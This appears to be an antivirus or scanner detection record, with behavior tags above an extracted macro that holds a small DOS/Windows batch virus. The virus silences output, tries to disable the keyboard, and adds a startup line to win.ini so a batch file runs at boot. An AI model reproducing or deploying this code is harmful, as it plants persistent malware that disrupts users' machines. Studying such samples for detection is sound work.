behavior.run: May run an executable file or a system command
behavior.system: May run an executable file or a system command on a Mac

docinfo.macro:

cls
@echo off
ctty nul
rundll32.exe Keyboard, disable

:residency
[windows]>r
load=c:\window\update.bat
run=>>r
NullPort=None>>r
.>>r
copy R + %winbootdir%\win.ini %winbootdir%\system\win.ini
del %winbootdir%\win.ini
move %winbootdir%\system\win.ini %winbootdir%\win.ini
deltree /y r
:regester vir
